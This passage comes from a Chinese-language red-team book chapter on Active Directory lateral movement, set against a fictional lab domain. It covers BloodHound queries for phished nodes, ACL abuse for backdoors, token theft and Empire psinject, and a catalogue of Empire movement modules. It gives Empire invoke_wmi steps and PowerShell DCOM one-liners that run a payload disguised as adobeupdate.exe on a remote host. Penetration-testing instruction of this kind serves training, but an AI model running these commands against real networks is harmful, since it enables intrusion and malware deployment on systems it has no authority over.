n.name=“PI:EMAIL” SET
n.owned=“phish”， n.wave=1
运行查询以显示所有被仿冒的系统
MATCH (n) WHERE n.owned=“phish” RETURN n
现在，我们可以向 Bloodhound 添加一些自定义查询。在Bloodhound 的“查询”选项卡上，滚
动到底部，单击“自定义查询”旁边的“编辑”按钮。用以下内容替换所有文本：
https://github.com/porterhau5/BloodHound-Owned/blob/master/customqueries.json
保存之后，我们应该创建更多的查询。现在我们可以单击查找结果“查找从所属节点到域管理
员的最短路径”。
如果你想更仔细地研究这个问题，请查看 @porterhau5的 fork 版 Bloodhound。它用标记使
被攻陷机器更直观，并允许更多的自定义功能：https://github.com/porterhau5/bloodhound-
owned 。
到目前为止，在没有扫描的情况下，我们已经能够获得关于该组织的大量信息。这都是作为
本地 AD 用户（域用户）的权限能做到的的，而且在大多数情况下，没有任何网络流量看起
来太可疑。正如你所看到的，我们能够做到这一切，而无需成为本地管理员或对本地系统拥
有任何管理权限。
Advanced ACL/ACE Bloodhound
137
第4章 带球——开始攻击网络
当使用 Bloodhound 的收集方法访问控制列表（ACL）类型时，我们的脚本将查询 AD 以收集
用户和对象的所有访问控制权限。我们从访问控制项（ACEs)收集的信息描述了用户、组和计
算机的允许和拒绝权限。寻找和利用 ACEs 本身就是一个能写成完整的书的内容，但这里有
一些很好的启动资源：
BloodHound 1.3–acl 攻击路径更新
https://wald0.com/?p=112
介绍对抗性恢复方法
http://bit.ly/2GYU7S7
在将 ACL 数据导入 Bloodhound 时，我们要寻找什么信息？Bloodhound 识别出 ACE 中可能
存在弱点的地方。这将包括谁有能力更改或重置密码、向组中添加成员、为其他用户更新脚
本路径等对象、更新对象或在对象上写入新的 ACE 等等。
怎么使用这个东西呢？当攻陷到某个用户和获得额外的凭证后，我们可以通过目标路径找到
一个有能力重置密码或修改 ACE 权限的用户。这将导致会有新的方法来找到到域管理员或特
权帐户的路径，甚至允许设置后门以供以后使用。了解这些类型的利用方法的一个很好的资
源是：Robbins-An-ACE-Up-The-Sleeve-DesigningActive-Directory-DACL-Backdoors 演讲
。
横向漫游——移动
在一个拥有多个用户的机器上，通常的做法是创建一个新的用户凭证或者迁移不同用户的凭
证。这种方法大量用于在环境中横向移动，这并不是什么新鲜问题。通常，从 Bloodhound 输
出或共享工作站，作为攻击者，我们需要能够模仿被攻陷的受害者系统上的其他用户。
我们拥有的许多工具可以用不同的方法来实现这一点。比如 Metasploit，我们都应该非常熟悉
使用 Post Exploitation 隐蔽框架来窃取 token。
在 Empire 中，我们可以使用窃取 token 来模拟该系统上的用户。我注意到，有时候窃取
token 会让我们的 shell 下线。为了避免这种情况，我们可以将一个新的 agent 注入到另一个
用户拥有的正在运行的进程中。
在下面的图片中，我们使用钓鱼让一个员工运行了我们的恶意软件。。这使得我们可以在受
害者用户的系统中运行我们自己的程序（neil.pawstrong）。在那个用户的系统上，我们可以
转到 BuzzClawdrin 的系统，并用WMI（WindowsManagementInstrumentation）命令执行获
得了一个新的 agent。这里的问题是，我们在最初攻击受害者 Neil.Pawstrong 的过程中，因
为我们使用缓存的凭证在 Buzz 的主机上生成了一个 shell。因此，我们不应该窃取 token，而
应该使用 Empire 的 psinject 功能。
psinject 描述“能够使用 ReflectivePick 将代理注入另一个进程，从而将通用.NET运行库时加
载到进程中并执行特定的 PowerShell 命令，而无需启动新的 PowerShell.exe 进程！”[
http://bit.ly/2HDxj6x ]，我们使用它来生成一个全新的、以 buzz.clauldrin 的用户进程运行的
agent，这样我们现在就可以获得他的访问权限。
138
第4章 带球——开始攻击网络
离开初始主机
现在你已经找到了将要移动到的潜在路径，那么获得这些系统的代码执行的选项是什么？最
基本的方法是使用我们当前的有 Active Directory 权限的用户以获得对另一个系统的控制权，
举个例子，一个经理可以完全访问其下属的计算机，一个拥有多个具有管理权限的会议/实验
组计算机，他们的内部系统配置错误，或者发现有人手动将用户添加到该计算机上的本地管
理组。这都是普通用户可以拥有远程访问到网络上的其他工作站的可能的一些方式。一旦攻
陷了一台目标机器，我们既可以获取 Bloodhound 的结果，也可以重新扫描网络以查看我们在
哪些机器上具有本地访问权限：
Empire 模块:
situational_awareness/network/powerview/find_localadmin_access
Metasploit 模块：http://bit.ly/2JJ7ILb
Empire 的 find_localadmin_access 将查询 Active Directory 中的所有主机名并尝试连接到它
们。这绝对是一个会造成很大动静的工具，因为它需要连接到每个主机并且验证它是否是本
地管理员。
我们可以看到，Empire 的 find_localadmin_access 模块标明了用户访问我们的陷阱的是一个
buzz.cyberspacekittens.local 机器。这应该和我们的 Bloodhound 回显的是一样的。为了再次
检查我们是否有访问权限，我通常会执行一些非交互的远程命令，比如 dir [remote
139
第4章 带球——开始攻击网络
system]\C$ 并查看我们是否有对 C 盘的读/写权限。
在域内横向移动方面，有好几种做法。让我们先来看看 Empire 中最常见的（直接从 Empire
中提取的）：
inveigh_relay：Inveigh 的 SMB 中继功能。此模块可用于将传入的 HTTP/Proxy
NTLMv1/NTLMv2身份验证请求中继到 SMB 目标。如果成功地中继了身份验证，并且帐
户具有较高的权限，则将在目标机器上利用 PSExec 执行指定的命令或 Empire 启动程
序。
invoke_executemsbuild：此函数使用 msbuild 和 inline task（内联任务）在本地/远程主
机上执行 PowerShell 命令。如果提供了凭据，则在本地装入默认管理共享。此命令将在
启动 msbuild.exe 进程的前后执行，而不启动 powershell.exe。
invoke_psremoting：使用 psremoting 在远程主机上执行 stager。只要受害者启用了
PSRemoting（这不总是启用的），我们就可以通过此服务执行 PowerShell。
invoke_sqloscmd：在远程主机上执行命令或着使用 xp_cmdshell 程序。就会反弹回一个
xp_cmdshell！
invoke_wmi：使用 WMI 在远程主机上执行 stager。发现目标几乎总是启用了 WMI，这
是执行 PowerShell payload 的一个很好的方法。
jenkins_script_console：将 Empire 代理部署到具有对脚本控制台未经身份验证访问权限
的 Windows Jenkins 服务器。如我们所知，Jenkins 服务器是常见的，没有凭据通常意
味着要使用 RCE 来通过 /script 端点。
invoke_dcom：通过 DCOM 上的 MMC20.Application COM 对象在远程主机上调用命
令。允许我们在不使用 psexec，WMI 或 PSRemoting 的情况下渗透进去。
invoke_psexec：使用 PsExec 类型在远程主机上执行 stager 功能。这是使用 PsExec 移
动文件并执行的传统方法。这可能会触发警报，但如果没有其他可用的方法，这仍然是
一个好方法。
invoke_smbexec：使用 SMBExec.ps 在远程主机上执行 stager。我们可以使用 samba
工具进行类似的攻击，而不是使用 PsExec。
invoke_sshcommand：通过 SSH 在远程主机上执行命令。
invoke_wmi_debugger：使用 WMI 将远程计算机上的目标二进制文件的调试器设置为
cmd.exe 或 stager。使用类似 sethc（粘滞键）的调试器工具来执行我们的代理。
new_gpo_immediate_task：生成“即时”的 schtask 以通过指定的 GPO 推出。如果你的
用户帐户有权修改 GPO，此模块允许你将“即时”计划任务推送到可以编辑的 GPO，允许
在应用 GPO 的系统上执行代码。
140
第4章 带球——开始攻击网络
[http://www.harmj0y.net/blog/empire/empire-1-5/]
这些只是一些最简单和最常见的横向内网漫游技术。在本书的后面，我们将讨论一些不太常
见的绕过网络的技术。在大多数内网中，通常启用 Windows Management
Instrumentation（WMI），因为它是管理工作站所必需的服务。因此，我们可以使用 invoke-
wmi 横向移动。由于我们使用的是本地缓存凭据，且我们的帐户可以访问远程主机，因此我
们不需要知道用户的凭据。
在远程系统上执行
usemodule lateral_movement/invoke_wmi
设置你即将入侵的主机的相关信息：
set ComputerName buzz.cyberspacekittens.local
配置你将使用的监听器:
set Listener http
连接到远程主机并执行恶意程序:
execute
和新的 agent 交互：
agents
interact
sysinfo
利用 DCOM 的横向移动
有许多方法可以在主机上进行单次横向移动。如果泄露的帐户具有访问权限，或者你能够使
用捕获的凭据创建令牌，我们可以使用 WMI、PowerShell 远程命令执行或 PSExec 生成不同
的 shell。如果这些执行命令的方法受到监控怎么办？我们通过使用分布式组件对象模型
（DCOM）实现一些很酷的 Windows 功能。DCOM 是用于在不同远程计算机上的软件组件
之间通信的 Windows 功能。
你可以使用 Powershell 命令列出计算机的所有 DCOM 应用程序：GetCimInstance
Win32_DCOMApplication
141
第4章 带球——开始攻击网络
安全研究员 @enigam0x3 的研究发现（ https://enigma0x3.net/2017/01/23/lateral-movement-
via-dcom-round-2/ ），有多个对象（例如 ShellBrowserWindow 和 ShellWindows ）允许在
受害者主机上远程执行代码。当列出所有 DCOM 应用程序（如上图所示）时，你将看到一个
CLSI 为 C08AFD90-F2A1-11D1-845500A0C91F3880 的 ShellBrowserWindow 对象。识别出
该对象后，只要我们的帐户有权访问，我们就可以利用此功能在远程工作站上执行二进制文
件。
powershell
$([activator]::CreateInstance([type]::GetTypeFromCLSID(“C08AFD90-F2A1-11D1-8455-
00A0C91F3880”，“buzz.cyberspacekittens.local”))).Navigate(“c:\windows\system32\cal
c.exe”)
这将只在系统本地执行文件，并且我们不能将任何命令行参数包含到可执行文件中（因此不
能使用 cmd /k 类型的攻击）。相反，我们可以从远程系统调用文件并执行它们，但请注意，
用户将收到警告的弹窗。在本例中，我目前在一个受害者的主机 neil.cyberspacekittens.local
上，该主机可以管理访问一个名为 buzz 的远程工作站。我们将在 Neil 的工作站上共享一个
文件夹，并托管我们的 payload。接下来，我们可以调用 DCOM 对象在远程受害者（buzz）
计算机上执行托管的 payload。
$([activator]::CreateInstance([type]::GetTypeFromCLSID(“C08AFD90-F2A1-11D1-8455-
00A0C91F3880”，“buzz.cyberspacekittens.local”))).Navigate(“\neil.cyberspacekittens.local\
Public\adobeupdate.exe”)
正如你在下一张图片中看到的，Buzz 的计算机上出现了一个关于运行 adobeupdate.exe 文件
的弹出窗口。虽然大多数用户都会点击并运行这个，但它可能会让我们被目标察觉。
142
第4章 带球——开始攻击网络
因此，避免这个问题的更好方法是在使用 DCOM 执行该文件之前将该文件移到上面（类似于
装载受害者的驱动器）。@Enigam0x3对此做得更进一步，并利用 Excel 宏来使用 DCOM。
首先，我们需要在自己的系统上创建恶意 Excel 文档，然后使用 PowerShell 脚本在受害者主
机上执行此.xls 文件。
需要注意的一点是，有许多其他的 DCOM 对象可以从系统中获取信息，可能会启动或停止服
务等等。这无疑为进一步研究 DCOM 功能提供了很好的起点。
参考文献：
https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/
https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/
https://www.cybereason.com/blog/dcom-lateral-movement-techniques